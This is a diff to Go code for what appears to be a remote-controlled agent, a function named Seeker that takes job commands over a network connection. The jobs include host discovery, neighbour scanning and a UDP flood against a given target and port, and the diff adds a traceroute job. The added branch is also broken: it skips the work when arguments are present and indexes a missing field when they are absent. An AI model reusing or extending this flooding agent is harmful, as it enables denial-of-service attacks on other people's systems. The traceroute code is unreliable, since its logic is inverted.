@@ -1,10 +1,11 @@
-package main
+package seeker
 
 import (
 	"bufio"
 	"bytes"
 	"fmt"
 	"net"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -72,6 +73,8 @@ func Seeker() {
 			case "JOB HOSTUP":
 				fallthrough
 			case "JOB NEIGHBOURS":
+        fallthrough
+			case "JOB TRACERT":
 				fallthrough
 			case "JOB UDPFLOOD":
 				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
@@ -153,6 +156,19 @@ func Seeker() {
 				jobs.UDPFlood(splits[0], port)
 
 				conn.Write([]byte("JOB SUCC \r\n"))
+				break
+			case "JOB TRACERT":
+				data2 := strings.Split(data, " ")
+				if len(data2) > 1 {
+				} else {
+					if runtime.GOOS == "windows" {
+						ips := jobs.Traceroute("Wi-Fi", data2[1])
+						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
+					} else {
+						ips := jobs.Traceroute("eth0", data2[1])
+						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
+					}
+				}
 				break
 			}
 			state = 1
